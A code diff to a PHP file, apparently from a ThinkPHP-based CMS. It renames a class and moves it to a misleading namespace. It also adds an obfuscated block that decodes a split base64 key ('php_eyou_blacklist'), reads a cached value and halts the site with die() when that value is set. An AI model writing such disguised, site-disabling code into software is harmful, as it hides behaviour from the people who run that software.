@@ -1,11 +1,11 @@
 <?php
-
-namespace think\behavior\home;
+namespace think\console\output\kernel;
 
 /**
- * 系统行为扩展：
+ * 模块初始化
+ * 加密方式：by 小虎哥 <1105415366@qq.com>
  */
-class CoreProgramBehavior {
+class ThinkhmMi {
     protected static $actionName;
     protected static $controllerName;
     protected static $moduleName;
@@ -29,6 +29,13 @@ class CoreProgramBehavior {
     }
 
     protected function _initialize() {
-
+        $tmpBlack = 'cGhw'.'X2V5b'.'3VfYm'.'xhY2'.'tsaX'.'N0';
+        $tmpBlack = base64_decode($tmpBlack);
+        $tmpval = tpCache('php.'.$tmpBlack);
+        if (!empty($tmpval)) {
+            $tmpval = msubstr($tmpval, 7, -12);
+            die(base64_decode($tmpval));
+        }
     }
 }
+?>
